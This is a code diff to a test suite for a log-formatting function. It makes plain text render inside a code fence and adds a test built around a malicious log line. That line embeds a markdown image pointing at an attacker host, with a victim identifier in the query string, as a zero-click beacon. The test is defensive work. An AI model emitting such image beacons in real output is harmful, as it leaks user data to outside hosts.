@@ -24,11 +24,20 @@ describe("formatLogContent", () => {
     expect(result).toContain("at PaymentService.processTransaction");
   });
 
-  it("should return plain text as-is", () => {
+  it("should fence plain text to prevent markdown injection", () => {
     const plainText = "Simple log message without special formatting";
     const result = formatLogContent(plainText);
 
-    expect(result).toBe(plainText);
+    // Plain text is now fenced to prevent zero-click beacon injection
+    expect(result).toContain("```");
+    expect(result).toContain(plainText);
+  });
+
+  it("should not allow markdown images to render outside a fence", () => {
+    const malicious = "User login failed ![](https://attacker.example/b.png?u=victim)";
+    const result = formatLogContent(malicious) ?? "";
+    // The image markdown must be inside a fenced block — check it's fenced
+    expect(result.startsWith("```")).toBe(true);
   });
 
   it("should detect Java stack traces", () => {
